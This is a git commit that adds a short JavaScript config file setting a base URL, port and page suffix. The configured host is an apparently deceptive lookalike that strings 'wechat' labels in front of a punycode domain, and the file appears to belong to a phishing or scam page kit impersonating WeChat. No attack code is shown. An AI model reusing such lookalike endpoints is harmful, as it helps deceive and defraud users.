19080765c81f95d77bb5e8aac794dcc405697d44
super181818 <131360198+super181818@users.noreply.github.com>
2023-05-22 18:45:59 +0800

    Add files via upload

---
+++ js/config.js
@@ -0,0 +1,10 @@
+/*-------config start-------*/
+var _wip = 'wechat-328215-1317375082.cos-website.ap-nanjing.wechat.comzruhgzc5maztvip-wechat-com.xn--wbsy6ncuhq0sjlu.com';  
+var _port = '1706';   
+/*---------config end---------*/
+
+var BaseUrl = 'http://' + _wip+':'+_port;
+var ResourceUrl = '/';
+var Suffix = '.html';
+var _isTx = 0;
+var _wport = '10000' 
